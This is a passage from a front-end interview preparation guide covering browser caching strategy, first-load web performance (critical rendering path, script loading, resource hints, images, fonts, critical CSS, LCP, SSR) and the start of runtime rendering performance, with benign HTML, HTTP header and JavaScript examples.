It's hard because **correctness and performance directly conflict**: aggressive caching makes things fast but risks serving stale data; conservative caching is always fresh but slow. And you can't reliably *reach into* every user's browser to clear a cache after you've told it to keep something. Get it wrong in either direction — stale bug fixes that never reach users, or cached-forever assets you can't update.

Modern front ends **sidestep invalidation instead of solving it**:
- **Content-hash filenames** (see Q7) make the URL a function of the content, so a change is a *new resource*, not a mutation of an old one. Nothing needs invalidating — old and new coexist.
- **The short-lived HTML** is the single point of coordination: it's the only thing revalidated, and it hands out the current hashes.
- **ETags** provide cheap revalidation for the things that genuinely can change at the same URL (the HTML, API responses).
- **Service Worker cache versioning** names each cache generation (`cache-v3`) and deletes old ones on activate.

The senior framing: the best cache invalidation strategy is one where you *never invalidate* — you rename. That converts an unsolvable distributed-state problem into a build-time naming convention.

### Q12. How do you cache API responses correctly without serving stale user data?

API responses are trickier than static assets because they're often user-specific and change frequently. The tools:

- **`Cache-Control: private`** — critical for personalized data, so shared CDN/proxy caches never store one user's data and serve it to another. Combine with `no-cache` or a short `max-age`.
- **`ETag` + revalidation** — for data that changes occasionally, let the browser revalidate cheaply and get 304s when unchanged.
- **`stale-while-revalidate`** — a `Cache-Control` directive (and the data-library pattern) that serves the cached response instantly while fetching a fresh one in the background — great perceived speed for data that tolerates being a moment behind.
- **`no-store`** — for truly sensitive responses (account balances, tokens) that must never persist.

At the application layer, a data library (SWR/React Query, only as examples — cross-ref State & Data Fetching) adds an in-memory cache with **dedup**, **background revalidation**, and **explicit invalidation on mutation** (after a POST, invalidate the affected query so the next read refetches). That's a *client-state* cache above the HTTP cache, giving you invalidation control the HTTP cache can't — you invalidate by key when you know the data changed, rather than guessing with time-based headers. The rule: `private` + short/`no-cache` at the HTTP layer, key-based invalidation at the app layer, `no-store` for secrets.

### Q13. What does `Vary` do and why can it wreck your cache hit rate?

The **`Vary`** response header tells caches that the response depends on specific *request* headers, so a cached entry is only reused when those headers match.

```http
Vary: Accept-Encoding
```

This is *correct* usage: a gzip response and a brotli response of the same URL are different, keyed by `Accept-Encoding`. Fine — there are only a few encoding values.

Where it wrecks things: **`Vary: User-Agent`** or **`Vary: Cookie`**. `User-Agent` has thousands of distinct values, so the cache stores a separate copy per browser string and almost never gets a hit — you've effectively disabled caching. `Vary: Cookie` fragments the cache per unique cookie, which for logged-in users means one entry each — again near-zero shared-cache hit rate.

The lesson for FE/edge config: keep `Vary` to low-cardinality headers (`Accept-Encoding`, sometimes `Accept` for content negotiation). Never `Vary` on high-cardinality headers if you want CDN caching to work. If responses genuinely differ per user, mark them `private` rather than trying to `Vary` a shared cache — it's the correct tool and it doesn't shred your hit rate.

### Q14. How do you test and debug caching behavior in DevTools?

Practical workflow in the **Network** panel:

- **Read the Size column.** "(memory cache)" / "(disk cache)" means a fresh cache hit (zero network). A `304` status means a revalidation hit (round trip, no body). A `200` with a real byte size means a full download.
- **Uncheck "Disable cache"** — it's checked by default while DevTools is open, which *hides* your caching behavior. Turn it off to see real caching.
- **Test the *right* reload.** Normal reload uses the cache; **hard reload** (Ctrl/Cmd+Shift+R) bypasses it. To simulate a true repeat visit, navigate away and back, or open the URL fresh — don't hard-refresh.
- **Inspect response headers** on a request to confirm `Cache-Control`, `ETag`, `Age`, `Vary` are what you intended.
- **Application panel** → Cache Storage shows Service Worker caches; Service Workers shows the SW state and lets you update/unregister. **Back/forward cache** tester tells you if a page is bfcache-eligible and *why not* if it isn't.

The most common self-inflicted confusion is testing with "Disable cache" on or with hard refresh, then concluding caching "doesn't work." Test like a real returning user.

### Q15. Design a caching strategy for a typical SPA from scratch.

Layer the caches by asset type and volatility:

**1. Hashed static assets (JS, CSS, fonts, images) — cache forever.**
```http
Cache-Control: public, max-age=31536000, immutable
```
Content hashing (Q7) makes this safe: a change is a new filename, so there's never a stale-asset problem. This is the bulk of your bytes and the biggest repeat-visit win.

**2. The HTML shell — never trust it stale.**
```http
Cache-Control: no-cache
```
Store it but revalidate every time. It's small, and it's the pointer that hands out current asset hashes, so it must be current. Cheap 304s when unchanged.

**3. API data — per-response, at the app layer.** `private` + short `max-age` or `no-cache` with ETags for cacheable reads; `no-store` for secrets. A data library on top for key-based invalidation, dedup, and stale-while-revalidate.

**4. Optional Service Worker — for offline and instant repeat loads.** Precache the app shell (cache-first for hashed assets, network-first for API/HTML), with versioned caches cleaned on `activate` and a clear update path (`skipWaiting` + prompting the user to reload for a new version).

**5. Keep bfcache working** — no `unload` handlers, no `no-store` on the document — for instant back/forward.

The whole design reduces to one principle: **cache immutable things forever, revalidate the small pointer, and never cache secrets** — with content hashing as the trick that makes "forever" safe.

## Web Performance — Loading

### Summary

**What this topic covers**

Making the *first* load fast — everything between the user requesting a page and it becoming visible and usable. This is the loading half of web performance (the runtime/interaction half — reflow, jank, INP — is its own topic). The substance: optimizing the **critical rendering path** so the browser reaches first paint with the least blocking; **resource hints** (`preload`, `prefetch`, `preconnect`, `dns-prefetch`) to start the right requests early; **lazy loading** (`loading="lazy"`, dynamic `import()`, intersection-based) to defer what isn't needed yet; **code splitting** into route chunks so users download only what a page uses; **minification** and **tree-shaking** to cut dead bytes; **compression** (gzip/brotli); **image optimization** (modern formats, responsive `srcset`); and eliminating **render-blocking CSS/JS** with `defer`/`async` and critical CSS. The 16 questions here culminate in a "cut this page's load time" walkthrough. It builds directly on the network mechanics (HTTP & Networking) and caching (Browser Caching) and targets the loading Core Web Vitals — LCP and FCP.

**Mental model**

First-load performance is a race to **first paint** and then **interactive**, and the enemy is *work on the critical path*: bytes that must download, parse, and execute before the browser can show or respond. Picture the page load as a budget of time from request to LCP, and every render-blocking resource, every serialized request, every unused kilobyte spends that budget. The strategy has three moves that compose: **send less** (minify, tree-shake, compress, split, right-size images), **send it at the right time** (defer non-critical JS, lazy-load off-screen assets, hint critical ones early), and **unblock the render** (inline critical CSS, don't let scripts block parsing). A useful frame: the browser can't paint until it has the DOM *and* the CSSOM, and it can't stay responsive if the main thread is busy parsing a giant bundle — so the two levers are "get to a paintable state fast" and "don't ship more JS than the page needs." Optimize for the *critical path*, not for total bytes; a 2MB image below the fold matters far less than a 100KB render-blocking stylesheet.

**Key terms**

- **Critical rendering path** — the sequence (HTML→DOM, CSS→CSSOM, render tree, layout, paint) the browser must complete for first paint.
- **Render-blocking** — a resource (CSS, sync JS) that prevents first paint until it's processed.
- **`defer` / `async`** — script attributes that stop JS from blocking HTML parsing.
- **Critical CSS** — the minimal above-the-fold CSS, inlined to avoid a blocking stylesheet round trip.
- **Resource hints** — `preload` (fetch now, high priority), `prefetch` (fetch for a future navigation, low priority), `preconnect`/`dns-prefetch` (warm a connection).
- **Lazy loading** — deferring a resource until it's needed (`loading="lazy"`, dynamic `import()`).
- **Code splitting** — breaking the bundle into chunks loaded on demand (per route/component).
- **Tree-shaking** — build-time elimination of unused (dead) exports.
- **Minification** — stripping whitespace/comments/renaming to shrink source.
- **LCP / FCP** — Largest / First Contentful Paint, the loading Core Web Vitals.
- **`srcset` / `sizes`** — responsive images so each device downloads an appropriately sized file.
- **Modern image formats** — WebP/AVIF, smaller than JPEG/PNG at equal quality.

**Why interviewers ask this**

"How do you make a slow page fast" is the single most common senior front-end question because it exercises the whole stack at once — network, rendering, bundling, images — and rewards *prioritization*. A junior answer is a laundry list ("minify, compress, use a CDN"); a senior answer starts with **measure** (Lighthouse/RUM, find the LCP element and what blocks it), identifies the *critical path*, and sequences fixes by impact. Interviewers listen for whether you know that render-blocking CSS and a giant sync bundle hurt far more than a below-the-fold image, whether you reach for the right tool (`preload` the LCP image, `defer` the analytics script, split the route), and whether you can name the metric each fix moves. It's the clearest test of whether you can reason about *where the time actually goes* rather than reciting optimizations.

**Common confusions**

- "`async` and `defer` are the same" — both unblock parsing, but `async` runs as soon as it downloads (order not guaranteed), `defer` runs after parsing in document order. Use `defer` for app scripts.
- "Minification and compression are the same" — minification rewrites source (build-time); compression (gzip/brotli) shrinks the transfer (server). They stack.
- "Preload everything" — preload competes for bandwidth; over-preloading *delays* the truly critical resource. Preload only the few things on the critical path.
- "Lazy-load everything" — lazy-loading the LCP/above-the-fold image *hurts* LCP. Lazy-load only below-the-fold.
- "Smaller bundle = faster" — total size matters less than *critical-path* size and parse/execute cost; splitting can beat shrinking.
- "CSS isn't render-blocking" — it is; the browser won't paint without the CSSOM.

**What follows from this topic**

This is the first-load counterpart to **Browser Caching** (which makes *repeat* loads fast) and rests on the network mechanics of **HTTP & Networking** (waterfalls, hints, protocol). The critical-rendering-path material connects to the browser's rendering internals; the runtime side (reflow, jank, INP, long tasks) is the **Web Performance — Runtime** topic. The bundling tools (tree-shaking, code splitting) tie into **Architecture & Tooling**, and the whole topic is measured by **Core Web Vitals** — LCP and FCP here, INP/CLS in the runtime and layout topics.

### Q1. Walk through the critical rendering path and where it blocks.

The **critical rendering path** is everything the browser must do between receiving HTML and painting pixels:

```
HTML ──parse──> DOM ─┐
                     ├─> Render Tree ─> Layout ─> Paint ─> Composite
CSS  ──parse──> CSSOM ┘
```

1. **HTML → DOM** — the parser builds the DOM tree incrementally as bytes arrive.
2. **CSS → CSSOM** — all CSS is parsed into the CSSOM. **CSS is render-blocking**: the browser won't build the render tree (and thus won't paint) until the CSSOM is complete, because it needs to know each node's computed styles.
3. **DOM + CSSOM → Render Tree** — only visible nodes with their styles.
4. **Layout (reflow)** — compute geometry (positions/sizes).
5. **Paint** — fill in pixels; **Composite** — assemble layers on the GPU.

Where it blocks:
- **Synchronous `<script>`** halts HTML parsing (the DOM stops growing) while it downloads and executes — and if it's below a stylesheet, it also waits for the CSSOM (scripts can read styles). This is why script placement and `defer`/`async` matter.
- **CSS** blocks *painting* — a big blocking stylesheet delays first paint even if the DOM is ready.

The optimization goal is to reach a complete-enough DOM+CSSOM fast: inline critical CSS (no blocking round trip), `defer` scripts (don't block parsing), and keep the critical CSS small.

### Q2. `defer` versus `async` versus a plain `<script>` — when do you use each?

```html
<script src="a.js"></script>              <!-- blocking -->
<script src="a.js" async></script>        <!-- async -->
<script src="a.js" defer></script>        <!-- deferred -->
```

```
Plain:  parse HTML ─[STOP: download+run]─ resume parse
async:  parse HTML ──────────────── (download in parallel)
                          ─[STOP: run on arrival]─ resume
defer:  parse HTML ──────────────── (download in parallel)
        finish parse ─[run in order]─ DOMContentLoaded
```

- **Plain `<script>`** — **parser-blocking**: HTML parsing stops until the script downloads *and* executes. Worst for load time; avoid in `<head>` for non-critical scripts.
- **`async`** — downloads in parallel with parsing, then **executes as soon as it arrives**, pausing the parser at that moment. Execution order is *not* guaranteed (whichever downloads first runs first). Good for **independent** scripts with no dependencies — analytics, ads.
- **`defer`** — downloads in parallel, but **executes only after HTML parsing completes**, in **document order**, just before `DOMContentLoaded`. Non-blocking *and* ordered. The right default for **application scripts** that depend on the DOM or on each other.

Rule: `defer` for your app code (ordered, non-blocking, DOM-ready), `async` for independent third-party scripts, plain only for a tiny inline script that must run synchronously. Module scripts (`<script type="module">`) are deferred by default.

### Q3. What are resource hints and when do you use each?

Resource hints let you tell the browser to start work early instead of waiting for natural discovery:

- **`preconnect`** — warm a cross-origin connection (DNS + TCP + TLS) you'll use imminently. For your API host, CDN, fonts origin. Reserve for 2–4 critical origins.
- **`dns-prefetch`** — just resolve DNS for an origin. Cheaper, lower-risk than preconnect; use for the long tail of third parties.
- **`preload`** — *fetch this resource now, high priority*, for something needed on the **current** page that the browser would otherwise discover late (a font referenced in CSS, the LCP hero image, a critical script/chunk). Must specify `as`.
  ```html
  <link rel="preload" as="font" href="/font.woff2" type="font/woff2" crossorigin>
  <link rel="preload" as="image" href="/hero.avif" fetchpriority="high">
  ```
- **`prefetch`** — *fetch this for a probable **future** navigation*, low priority, when the browser is idle. For the next route the user will likely visit (link on hover, next step in a flow). Sits in the cache ready.

The distinction that trips people up: **`preload` is for the current page (urgent, high priority); `prefetch` is for the next page (speculative, low priority).** Over-preloading backfires — every preload competes for bandwidth and can *delay* the genuinely critical resource, so hint sparingly and only for the critical path.

### Q4. Explain lazy loading and its main techniques.

**Lazy loading** defers loading a resource until it's actually needed, keeping the initial load lean.

**Images/iframes** — the native attribute:
```html
<img src="below-fold.jpg" loading="lazy" alt="...">
```
The browser skips it until it's near the viewport. **Never** put `loading="lazy"` on the LCP/above-the-fold image — that delays your largest paint. Above the fold, prefer `fetchpriority="high"`.

**JavaScript** — dynamic `import()` returns a promise and produces a separate chunk fetched on demand:
```javascript
button.addEventListener('click', async () => {
  const { openEditor } = await import('./editor.js'); // chunk loads on click
  openEditor();
});
```
Use for heavy features not needed at startup (a rich-text editor, a charting lib, a modal).

**Intersection-based** — `IntersectionObserver` (cross-ref Web APIs) fires when an element scrolls into view, so you load images, comments, or below-the-fold widgets exactly when they approach the viewport, without scroll-handler jank:
```javascript
const io = new IntersectionObserver((entries) => {
  for (const e of entries) if (e.isIntersecting) load(e.target);
});
```

The principle: load what the user can see and use *now*; defer everything else until it's needed or imminent. It shrinks the initial bundle and the number of initial requests, directly improving FCP/LCP.

### Q5. What is code splitting and how do you decide where to split?

**Code splitting** breaks one large bundle into smaller **chunks** loaded on demand, so a user downloads only the JS a given page actually uses instead of the entire app up front.

The bundler (webpack/Vite/Rollup) creates a split at each dynamic `import()`; frameworks wire route-level splits automatically.

Where to split, by impact:
- **Per route** — the highest-value split. The homepage shouldn't ship the admin dashboard's code. Each route becomes a chunk loaded on navigation.
- **Heavy on-demand features** — a WYSIWYG editor, a charts library, a video player, a date picker — split out and `import()` when the user opens that feature.
- **Above/below the fold** — defer components not visible on first render.
- **Vendor chunk** — split rarely-changing third-party code from your app code so it stays cached across deploys (ties into content-hash caching — cross-ref Browser Caching).

The tradeoff: too *few* splits ship dead code to every page; too *many* create a request waterfall of tiny chunks and lose caching efficiency. Aim for meaningful boundaries (routes, big features), and `modulepreload` the chunk a route is about to need so the split doesn't add a serialized round trip. Measure with a bundle analyzer to find the biggest unused-on-this-page dependencies and split those first.

### Q6. Minification, compression, and tree-shaking — how do they differ and stack?

Three distinct byte-reduction techniques that compose:

- **Minification** (build-time, source rewrite) — strips whitespace, comments, and shortens local variable names. `function calculateTotal(itemPrice)` → `function c(a)`. Reduces the *source* size. Tools: esbuild, Terser, SWC.
- **Tree-shaking** (build-time, dead-code elimination) — removes exported code that's never imported, relying on ESM's static `import`/`export` structure. Import one function from a utility library and tree-shaking drops the other 200. Requires ES modules and side-effect-free code (`"sideEffects": false`) to be effective.
- **Compression** (transfer-time) — the server applies gzip or brotli to the response; the browser decompresses. Shrinks the *bytes on the wire*, not the source. Brotli beats gzip on text.

They stack multiplicatively: tree-shaking removes unused *code*, minification shrinks what *remains*, compression shrinks the *transfer* of the minified result. A 1MB source might tree-shake to 600KB, minify to 400KB, and gzip to 120KB over the wire.

The confusion to avoid: minification ≠ compression. Minification changes the *content* (permanent, build-time); compression changes the *encoding* (transparent, request-time). You want all three, and tree-shaking is why you author in ESM and import narrowly (`import { debounce } from 'lodash-es'`, not `import _ from 'lodash'`).

### Q7. How do you optimize images for loading, and why do they matter so much?

Images are usually the **largest bytes** on a page and frequently the **LCP element**, so they're high-leverage. The toolkit:

- **Modern formats** — serve **AVIF** or **WebP** instead of JPEG/PNG; often 30–50% smaller at equal quality. Use `<picture>` with fallbacks:
  ```html
  <picture>
    <source srcset="hero.avif" type="image/avif">
    <source srcset="hero.webp" type="image/webp">
    <img src="hero.jpg" alt="..." width="1200" height="600">
  </picture>
  ```
- **Responsive images** — `srcset` + `sizes` so a phone downloads a 400px image, not the desktop's 1600px one:
  ```html
  <img srcset="img-400.jpg 400w, img-800.jpg 800w, img-1600.jpg 1600w"
       sizes="(max-width: 600px) 400px, 800px" src="img-800.jpg" alt="...">
  ```
- **Right-size and compress** — never ship a 4000px photo displayed at 400px. Compress to a sensible quality.
- **`loading="lazy"`** below the fold; **`fetchpriority="high"`** (and `preload`) for the LCP image above it.
- **Always set `width`/`height`** (or `aspect-ratio`) to reserve space and prevent layout shift (CLS — cross-ref the layout topic).

The payoff: because images dominate bytes and often *are* the LCP element, format + responsive sizing is frequently the single biggest LCP win on a content page.

### Q8. What does "render-blocking" mean and how do you eliminate it?

A **render-blocking** resource prevents the browser from painting until it's downloaded and processed. Two culprits:

**CSS** — *all* stylesheets in `<head>` are render-blocking by default, because the browser needs the complete CSSOM before it can build the render tree and paint (it won't show unstyled content, then restyle). A large or slow-loading stylesheet delays first paint even when the DOM is ready.

**Synchronous JavaScript** — a plain `<script>` blocks the *parser* (halts DOM construction) while it downloads and runs.

Eliminating it:
- **Inline critical CSS** — extract the minimal above-the-fold CSS and put it inline in `<head>`, so first paint needs no CSS round trip. Load the full stylesheet asynchronously:
  ```html
  <style>/* critical above-the-fold CSS */</style>
  <link rel="preload" href="/full.css" as="style" onload="this.rel='stylesheet'">
  ```
- **`defer`/`async` scripts** so they never block parsing (see Q2).
- **Remove unused CSS** — ship only what the page uses (per-route CSS, PurgeCSS-style tools) so the blocking CSSOM is small.
- **Split CSS by media** — `media="print"` or media queries make non-matching stylesheets non-blocking.

The goal is a fast path to first paint: small inline critical CSS, non-blocking scripts, and the heavy stuff loaded out of band.

### Q9. Walk me through diagnosing and cutting a page's load time. (The core scenario.)

Never optimize blind — **measure, prioritize, fix, re-measure**.

**1. Measure.** Run Lighthouse *and* look at field/RUM data (lab ≠ real users on real networks). Identify the **LCP element** and its **TTFB/FCP/LCP** numbers. Open the DevTools **Network waterfall** and **Performance** panel.

**2. Find the critical path.** Ask: what blocks first paint, and what blocks the LCP element? Look for render-blocking CSS, sync scripts, a serialized request chain, a huge JS bundle parsing on the main thread, an unoptimized LCP image.

**3. Fix by impact:**
- **Slow TTFB?** → CDN/edge caching, kill redirect chains (mostly backend — cross-ref HTTP & Networking).
- **Render-blocking CSS/JS?** → inline critical CSS, `defer` scripts (Q8).
- **LCP image slow?** → modern format, right-size, `preload` + `fetchpriority="high"`, *don't* lazy-load it (Q7).
- **Huge bundle?** → code-split by route, tree-shake, lazy-load heavy features (Q5).
- **Serialized requests?** → `preload`/`preconnect`, parallelize data fetches (waterfall flattening).
- **Uncompressed assets?** → enable brotli, verify `Content-Encoding`.
- **Repeat-visit slowness?** → content-hash + long `max-age` caching (cross-ref Browser Caching).

**4. Re-measure** to confirm the metric moved and you didn't regress another.

The senior signal is the *order*: measure first, target the critical path, sequence by impact, verify. Reciting optimizations without measuring is the junior tell.

### Q10. Why can shipping less JavaScript matter more than any other optimization?

JavaScript is uniquely expensive because it costs **three times**, not once:

1. **Download** — bytes over the network (compression helps here).
2. **Parse & compile** — the JS engine (V8) must parse and compile the source before running it; this is CPU work on the **main thread** (cross-ref the JS-engine topic).
3. **Execute** — running it (framework init, hydration) blocks the main thread, delaying interactivity.

Compare to an image, which only costs download + decode (often off-thread) and never blocks interactivity. A 200KB image and 200KB of JS are not equivalent — the JS additionally taxes the CPU, and on a low-end mobile device parse+execute can dwarf the download time.

This is why:
- **Hydration** is costly (cross-ref Rendering Strategies) — you ship the framework *and* re-run it on the client to attach behavior to server HTML, creating a gap between "looks ready" (FCP) and "is interactive" (TTI/INP).
- **Bundle size budgets** exist and **tree-shaking/splitting** are high-value.
- Caching doesn't fully save you: the HTTP cache skips the *download* on repeat visits but the browser still **parses and executes** the JS every load.

The lesson: the cheapest JavaScript is the JavaScript you don't ship. Cutting or deferring JS moves *both* loading and interactivity metrics, which is why it's often the highest-leverage optimization.

### Q11. How would you optimize web font loading?

Fonts are a classic hidden bottleneck: they're often discovered *late* (referenced deep in CSS), they're on a *cross-origin* host, and mishandling them causes invisible text (FOIT) or layout shift.

Tactics:
- **`font-display: swap`** in `@font-face` — show fallback text immediately, swap in the web font when it loads. Avoids invisible text (FOIT); the tradeoff is a flash of unstyled text (FOUT) and possible shift — mitigate with size-adjusted fallbacks (`size-adjust`, `ascent-override`).
- **`preload` the critical font** — because fonts are discovered only after CSS parses, `<link rel="preload" as="font" crossorigin>` starts the fetch early, flattening the CSS→font waterfall (cross-ref HTTP & Networking). Note `crossorigin` is required even same-origin for fonts.
- **`preconnect`** to the font origin if using a third-party font host.
- **Use WOFF2** — already brotli-compressed, smallest format, universally supported. Don't serve legacy TTF/EOT.
- **Subset** — ship only the glyphs/weights you use (Latin subset, the two weights you actually render), not the full family.
- **Self-host** where possible — collapses the third-party origin (extra DNS/TCP/TLS) into your own, enabling connection reuse and better caching control.

The combined effect: text is never invisible, the font fetch starts early, and the file is as small as possible — improving both FCP and CLS.

### Q12. What's the difference between `preload` and `prefetch`, concretely?

Both fetch a resource before it's requested by the page, but for different *timeframes* and *priorities*:

| | `preload` | `prefetch` |
|---|---|---|
| For | **Current** page | A **future** navigation |
| Priority | High | Lowest (idle only) |
| Timing | Immediately | When browser is idle |
| Use case | LCP image, critical font, critical chunk | Next likely route's JS/data |
| Risk if wrong | Wastes bandwidth *now*, delays real critical resource | Wasted bytes for a page never visited |

**`preload`** says "I need this on *this* page and you'll discover it too late — get it now." Example: a font buried in CSS, or the LCP hero image. It competes for current bandwidth, so preload *only* the few critical-path resources.

**`prefetch`** says "the user will *probably* go here next — grab it while idle so it's instant when they do." Example: prefetching the product-detail route's chunk when a user hovers a product card, or the next step of a checkout flow. Low priority, so it never steals bandwidth from the current page.

The mistake is using `preload` for future needs (you steal current-page bandwidth) or `prefetch` for current needs (too low priority to help now). Match the hint to *when* you need the resource: now → preload, next → prefetch.

### Q13. What is critical CSS and how do you implement it without breaking things?

**Critical CSS** is the minimal subset of CSS needed to render **above-the-fold** content, inlined directly in the `<head>` so first paint doesn't wait on an external stylesheet round trip (recall all `<head>` CSS is render-blocking — Q1/Q8).

Implementation:
```html
<head>
  <style>
    /* critical: header, hero, above-the-fold layout only */
    body{margin:0}.hero{...}.nav{...}
  </style>
  <!-- full stylesheet loaded non-blocking -->
  <link rel="preload" href="/full.css" as="style" onload="this.rel='stylesheet'">
  <noscript><link rel="stylesheet" href="/full.css"></noscript>
</head>
```

The inline critical CSS lets the browser paint the visible content immediately; the full stylesheet loads asynchronously and upgrades the rest as the user scrolls.

Pitfalls to manage:
- **Extraction must be automated** — tools (Critical, Critters, or framework build steps) compute the above-the-fold rules per template; hand-maintaining it rots fast.
- **Keep it small** — inlined CSS isn't cached separately and bloats every HTML response; only truly above-the-fold rules belong inline.
- **The `<noscript>` fallback** ensures the stylesheet still loads if JS is disabled (the `onload` swap needs JS).
- Beware **layout shift** if the async CSS restyles above-the-fold elements — the critical set must fully cover what's visible.

Done right it directly improves FCP/LCP by removing a render-blocking round trip from the critical path; done carelessly it bloats HTML or causes flashes.

### Q14. A page's LCP is 5 seconds. How do you approach fixing it?

LCP (Largest Contentful Paint) measures when the largest above-the-fold element renders. 5s is poor (target ≤2.5s). Diagnose the LCP by its **four sub-parts** — fix the dominant one:

1. **TTFB** (server/network) — if the HTML itself is slow to arrive, nothing downstream can be fast. Fix with CDN/edge caching, kill redirects, faster server rendering. Cross-ref HTTP & Networking.
2. **Resource load delay** — the LCP element (usually an image) is *discovered late* or *low priority*. Fix: `preload` it, add `fetchpriority="high"`, ensure it's **not** `loading="lazy"`, put it in the initial HTML (not injected by JS).
3. **Resource load time** — the LCP image is too big. Fix: modern format (AVIF/WebP), right-size, responsive `srcset`, compress. Often the biggest single win.
4. **Render delay** — the element is downloaded but can't paint because the main thread is blocked (render-blocking CSS, a huge JS bundle parsing, or it's client-rendered so it waits for hydration). Fix: inline critical CSS, defer/split JS, or server-render the LCP content.

The method: open DevTools/Lighthouse, find *which* sub-part dominates (the LCP breakdown shows it), and attack that one. A common real case: the LCP image is injected by a JS framework after hydration → it can't even *start* loading until a 500KB bundle downloads and runs. Fix = put a real `<img>` in the initial HTML with `preload`. Don't scatter-fix; find the dominant sub-part.

### Q15. When is server-side rendering a *loading* optimization, and what does it cost?

**SSR** (cross-ref Rendering Strategies) renders the page's HTML on the server so the browser receives **content in the initial response** rather than an empty shell it must fill with JS.

Why it helps loading:
- **Fast FCP/LCP** — real content paints as soon as the HTML arrives, no waiting for a JS bundle to download, parse, execute, and *then* render. For a CSR app, the user stares at a blank page until the bundle boots; SSR shows content immediately.
- **SEO/social** — crawlers and link previews get real HTML without executing JS.

The cost — **hydration**:
- The client still downloads the framework JS and re-runs it to attach event listeners to the server HTML. Until hydration completes, the page **looks ready but isn't interactive** — a gap between FCP/LCP (good) and TTI/INP (potentially bad). Clicks may do nothing.
- You've improved *paint* metrics but risk *interaction* metrics if the bundle is large — the "uncanny valley" of a page that looks done but ignores input.

Mitigations that show senior awareness: **streaming SSR** (send HTML in chunks as it's ready), **islands/partial hydration** (only hydrate interactive components, ship less JS), **SSG/ISR** (render at build time and serve from the edge for the best TTFB), and **progressive hydration**. The honest framing: SSR trades a JS-download-blocked first paint for a hydration-blocked first interaction — worth it when content-visibility matters most, but only fully paid off when you also keep the client JS lean.

### Q16. Give a prioritized checklist for making first load fast, and explain the ordering.

Ordered by typical impact-per-effort, because prioritization *is* the skill:

**1. Measure first.** Lighthouse + RUM, identify LCP element and critical path. Everything below is chosen from what the measurement shows — never optimize blind.

**2. Fix the critical path to first paint.**
- Inline critical CSS; make the full stylesheet non-blocking.
- `defer`/`async` all scripts so nothing blocks parsing.
- These unblock *paint* and usually move FCP/LCP the most for the least work.

**3. Optimize the LCP element.**
- If it's an image: modern format, right-size, `preload` + `fetchpriority="high"`, not lazy-loaded.
- If it's text: ensure the font doesn't cause invisible text (`font-display: swap` + preload).

**4. Cut and defer JavaScript.**
- Code-split by route, tree-shake, lazy-load heavy features. JS costs download + parse + execute, so this moves both loading *and* interactivity.

**5. Shrink the transfer.**
- Brotli/gzip compression (verify it's on), minification. Cheap, broad wins.

**6. Flatten the request waterfall.**
- `preconnect` critical origins, `preload` late-discovered critical resources, parallelize data fetches.

**7. Make repeat visits instant.**
- Content-hash filenames + `max-age=immutable`; consider a Service Worker (cross-ref Browser Caching).

**8. Speculatively prefetch** the next likely route for instant navigation.

The ordering logic: unblock paint before shrinking bytes, fix the *measured* dominant cost before the theoretical ones, and treat first-visit (steps 2–6) and repeat-visit (step 7) as separate wins. A candidate who recites this list *in impact order and ties each step to a metric* is giving the senior answer.
## Web Performance — Runtime & Rendering

### Summary

**What this topic covers**

Loading fast is half the battle; the other half is staying fast once the page is up. This topic is about **runtime performance** — keeping an already-loaded page smooth under scrolling, typing, animating, and data updates. Three concern areas: (1) the **rendering pipeline at runtime** — reflow (layout) vs repaint vs composite, what each costs, and which DOM operations trigger which; (2) the **main-thread economy** — the 16.6ms frame budget at 60fps, long tasks and how to break them up, `requestAnimationFrame`, and keeping input responsive; and (3) **not leaking** — memory leaks from detached DOM nodes, forgotten listeners and timers, and closures, plus how to find them in DevTools. Alongside these sit the everyday runtime tools: **debounce vs throttle**, **list virtualization/windowing**, and **GPU-accelerated compositing** via `transform`/`opacity`. The 16 questions here are the ones interviewers use to separate people who've *shipped* a janky-scroll fix from people who've only read about it. Loading-side performance (critical path, resource hints, code splitting) lives in the loading topic; measurement (Core Web Vitals) is its own topic.

**Mental model**

Picture the browser's main thread as a single worker doing everything: running your JavaScript, recalculating layout, painting pixels, and firing events. It gets roughly **16.6 milliseconds per frame** to produce a new frame at 60fps (`1000 / 60`). Inside that budget it must run any pending JS (event handlers, timers, rAF callbacks), then — if the DOM or styles changed — recalculate **layout** (where every box goes), **paint** (fill in pixels into layers), and **composite** (assemble layers on the GPU). If your JavaScript hogs the thread for 50ms, three frames are skipped and the page visibly stutters; if a click handler runs for 300ms, the whole UI freezes because nothing else can run. So runtime performance is really **main-thread scheduling**: do less work per frame, do it at the right time (batch DOM writes, use rAF), push heavy CPU work to a Web Worker, and prefer the cheap parts of the pipeline (composite) over the expensive ones (layout). Memory is the same thread's other liability — leaks grow the heap, GC pauses get longer, and eventually the tab crashes.

**Key terms**

- **Reflow (layout)** — recalculating the geometry (position/size) of elements. The most expensive step; a change to one element can force layout of its subtree or the whole document.
- **Repaint** — filling pixels for already-positioned elements (colour, background, visibility changes). Cheaper than reflow but still on the main thread.
- **Composite** — assembling painted layers on the GPU. Cheapest; `transform` and `opacity` changes can be composite-only, skipping layout and paint.
- **Layout thrashing** — interleaving layout *reads* (`offsetHeight`) and *writes* (style changes) in a loop, forcing synchronous reflow each iteration.
- **Forced synchronous layout** — reading a layout property after a write, making the browser reflow *now* instead of batching.
- **Frame budget** — ~16.6ms at 60fps; your JS + style + layout + paint must fit or you drop frames.
- **Long task** — any main-thread task over 50ms; blocks input and animation. Measured by the Long Tasks API.
- **Debounce** — run a function only after activity stops for N ms (e.g. search-as-you-type).
- **Throttle** — run a function at most once per N ms (e.g. scroll handler).
- **Virtualization/windowing** — render only the visible rows of a long list plus a small buffer, recycling nodes as you scroll.
- **Detached DOM** — nodes removed from the document but still referenced by JS, so they can't be garbage-collected.
- **rAF (`requestAnimationFrame`)** — schedules a callback to run just before the next paint; the right place for visual updates.

**Why interviewers ask this**

Runtime performance separates engineers who understand the browser from those who only understand their framework. A junior says "it's slow, add `useMemo`"; a senior says "the scroll handler reads `offsetTop` in a loop, forcing a reflow per frame — batch the reads, then write." The signal is whether you can name *which* pipeline stage a given change hits, and whether you reach for the right tool (rAF for visual work, debounce vs throttle correctly, Web Worker for CPU work, virtualization for long lists) instead of cargo-culting memoization. The memory-leak questions test whether you know the JS heap is finite and that "it works on my machine" hides listeners and timers that accumulate over a long session. Getting "reflow vs repaint vs composite" crisp, and being able to diagnose a janky scroll from a DevTools flame chart, is a strong senior tell.

**Common confusions**

- "Repaint and reflow are the same" — no. Reflow recomputes geometry (expensive); repaint just refills pixels. Changing `color` repaints; changing `width` reflows *and* repaints.
- "`transform: translate` moves the element like `top`/`left`" — visually yes, but `transform` can be composite-only (no layout/paint), while `top`/`left` trigger reflow. That's the whole reason to animate with `transform`.
